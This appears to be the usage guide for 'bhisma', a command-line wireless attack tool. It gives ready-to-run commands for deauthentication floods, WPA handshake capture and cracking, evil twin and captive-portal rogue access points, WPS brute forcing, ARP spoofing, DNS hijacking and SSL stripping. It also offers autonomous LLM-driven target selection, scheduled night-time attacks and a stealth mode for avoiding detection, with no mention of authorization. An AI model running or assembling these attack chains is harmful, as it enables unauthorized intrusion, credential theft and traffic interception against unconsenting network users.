# Usage Guide

## Basic Commands

### Setup
```bash
# First-time setup
bhisma setup

# Install system dependencies
bhisma setup --install-system

# Install Python dependencies
bhisma setup --install-python
```

### API Key Management
```bash
# Add/update API keys (TUI)
bhisma keys --add

# List configured providers
bhisma keys --list

# Test all keys
bhisma keys --test
```

### Tool Management
```bash
# Check installed tools
bhisma tools check

# Install missing tools
bhisma tools install

# Install specific tool
bhisma tools install aircrack-ng

# List all supported tools
bhisma tools list
```

### Adapter Detection
```bash
# List wireless adapters
bhisma recon --list-adapters

# Enable monitor mode
bhisma recon --monitor-mode wlan0

# Disable monitor mode
bhisma recon --managed-mode wlan0mon
```

## Autonomous Mode

Fully automated attack chain from reconnaissance to exploitation.

```bash
bhisma auto --iface wlan0 --band 2.4,5 --timeout 30
```

**Options:**
- `--iface, -i` — Wireless interface (required)
- `--band` — Bands to scan: `2.4`, `5`, `6` (default: `2.4,5`)
- `--timeout, -t` — Auto-select timeout in seconds (default: 20)
- `--dashboard/--no-dashboard` — Launch web dashboard (default: true)
- `--offline` — Run without AI brain

**What happens:**
1. Adapter detection and monitor mode
2. WiFi reconnaissance (passive + active)
3. AI target selection based on vulnerability score
4. Attack chain execution (deauth → harvest → crack → mitm)
5. Real-time dashboard updates
6. Automated report generation

## Reconnaissance

### Scan Networks
```bash
# Passive scanning
bhisma recon --iface wlan0 --duration 60

# Active scanning with channel hopping
bhisma recon --iface wlan0 --active --bands 2.4,5 --duration 30

# Hidden SSID discovery
bhisma recon --iface wlan0 --discover-hidden
```

**Output:**
- BSSID, SSID, channel, signal strength
- Encryption type (WEP, WPA2, WPA3, Open)
- WPS status
- Connected clients
- Vulnerability score

### Target Profiling
```bash
# Profile specific target
bhisma recon --target AA:BB:CC:DD:EE:FF --iface wlan0

# Score targets
bhisma recon --score --iface wlan0
```

## Deauthentication

### Silent Pulse (Predictive)
```bash
bhisma deauth --target AA:BB:CC:DD:EE:FF --iface wlan0 --silent
```

### Directed Deauth
```bash
# Deauth specific client
bhisma deauth --target AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66 --iface wlan0

# Flood deauth
bhisma deauth --target AA:BB:CC:DD:EE:FF --iface wlan0 --count 50
```

### Fake Deauth
```bash
# Send fake deauth from rogue MAC
bhisma deauth --target AA:BB:CC:DD:EE:FF --iface wlan0 --fake --spoof-mac 00:11:22:33:44:55
```

## Handshake Harvesting

### Capture Handshake
```bash
bhisma harvest --target AA:BB:CC:DD:EE:FF --iface wlan0 --duration 120
```

### PMKID Capture
```bash
bhisma harvest --target AA:BB:CC:DD:EE:FF --iface wlan0 --pmkid-only
```

### Crack Captured Hash
```bash
bhisma harvest --crack --capture-file capture.cap --wordlist rockyou.txt
```

## Evil Twin Attacks

### Basic Rogue AP
```bash
bhisma evil-twin --target AA:BB:CC:DD:EE:FF --iface wlan0
```

### KARMA Attack
```bash
bhisma evil-twin --target AA:BB:CC:DD:EE:FF --iface wlan0 --karma
```

### MANA Attack
```bash
bhisma evil-twin --target AA:BB:CC:DD:EE:FF --iface wlan0 --mana
```

### Captive Portal
```bash
bhisma evil-twin --target AA:BB:CC:DD:EE:FF --iface wlan0 --portal
```

## WPS Attacks

### Pixie Dust
```bash
bhisma wps --target AA:BB:CC:DD:EE:FF --iface wlan0 --pixie
```

### Brute Force
```bash
bhisma wps --target AA:BB:CC:DD:EE:FF --iface wlan0 --brute
```

### Bully Attack
```bash
bhisma wps --target AA:BB:CC:DD:EE:FF --iface wlan0 --bully
```

## WEP Cracking

```bash
bhisma wep --target AA:BB:CC:DD:EE:FF --iface wlan0
```

## WPA2/WPA3 Attacks

```bash
# WPA2 handshake capture
bhisma wpa2 --target AA:BB:CC:DD:EE:FF --iface wlan0 --handshake

# WPA3 Dragonblood check
bhisma wpa3 --target AA:BB:CC:DD:EE:FF --iface wlan0 --dragonblood
```

## MITM Attacks

```bash
# ARP spoofing
bhisma mitm --arp --target AA:BB:CC:DD:EE:FF --iface wlan0

# DNS hijacking
bhisma mitm --dns --target AA:BB:CC:DD:EE:FF --iface wlan0

# SSL stripping
bhisma mitm --ssl-strip --target AA:BB:CC:DD:EE:FF --iface wlan0
```

## Web Dashboard

### Start Dashboard
```bash
# Start dashboard only
bhisma dashboard --port 8080

# Start with auto mode
bhisma auto --iface wlan0 --dashboard
```

### Dashboard Features
- **Network Map** — Real-time target visualization
- **Target Tree** — Discovered networks with scores
- **AI Brain Log** — AI decisions and reasoning
- **Attack Timeline** — Phase-by-phase execution
- **Terminal Panels** — Live tool output
- **System Status** — CPU, memory, interface, AI providers

## Autonomous Mode (Daemon)

### Start Daemon
```bash
# Start background daemon
bhisma daemon start

# Stop daemon
bhisma daemon stop

# Check status
bhisma daemon status
```

### Schedule Attacks
```bash
# Schedule autonomous attack
bhisma schedule --target AA:BB:CC:DD:EE:FF --time "02:00" --duration 3600
```

## Reporting

### Generate Report
```bash
# Generate markdown report
bhisma report --format markdown --output report.md

# Generate HTML report
bhisma report --format html --output report.html

# Generate JSON report
bhisma report --format json --output report.json
```

### AI-Enhanced Report
```bash
# Use AI to generate detailed analysis
bhisma report --ai --session-id <session_id>
```

## ML Features

### Device Fingerprinting
```bash
bhisma ml fingerprint --target AA:BB:CC:DD:EE:FF
```

### Success Prediction
```bash
bhisma ml predict --target AA:BB:CC:DD:EE:FF --attack deauth
```

### Anomaly Detection
```bash
bhisma ml detect --iface wlan0
```

## Configuration

### View Config
```bash
bhisma config show
```

### Edit Config
```bash
# Edit YAML config
bhisma config edit

# Set specific value
bhisma config set ai.enable_ai_brain true
```

### Reset Config
```bash
bhisma config reset
```

## Advanced Usage

### Custom Attack Chain
```bash
bhisma auto --iface wlan0 --chain recon,deauth,harvest,crack
```

### AI Consensus Mode
```bash
# Query 2+ LLMs for consensus
bhisma auto --iface wlan0 --consensus
```

### Stealth Mode
```bash
# Enable all stealth features
bhisma auto --iface wlan0 --stealth
```

### Specific AI Provider
```bash
# Use only Groq
bhisma auto --iface wlan0 --provider groq
```

## Examples

### Quick Recon
```bash
bhisma recon --iface wlan0 --duration 30
```

### Full Attack Chain
```bash
bhisma auto --iface wlan0 --timeout 30
```

### Targeted WPS Attack
```bash
bhisma wps --target AA:BB:CC:DD:EE:FF --iface wlan0 --pixie
```

### Evil Twin with Captive Portal
```bash
bhisma evil-twin --target AA:BB:CC:DD:EE:FF --iface wlan0 --portal
```

### Silent Deauth + Harvest
```bash
bhisma deauth --target AA:BB:CC:DD:EE:FF --iface wlan0 --silent
bhisma harvest --target AA:BB:CC:DD:EE:FF --iface wlan0 --duration 60
```

## Tips

1. **Always use monitor mode** — Required for most attacks
2. **Check signal strength** — Stronger signal = better success rate
3. **Use AI consensus** — More reliable decisions for critical ops
4. **Enable stealth** — Avoid detection in production environments
5. **Monitor dashboard** — Real-time visibility into attack progress
6. **Save captures** — Keep .cap files for offline cracking
7. **Test keys first** — Ensure AI providers are configured
8. **Use virtual environment** — Isolate dependencies

---

**Next:** [Architecture](04-architecture.md)
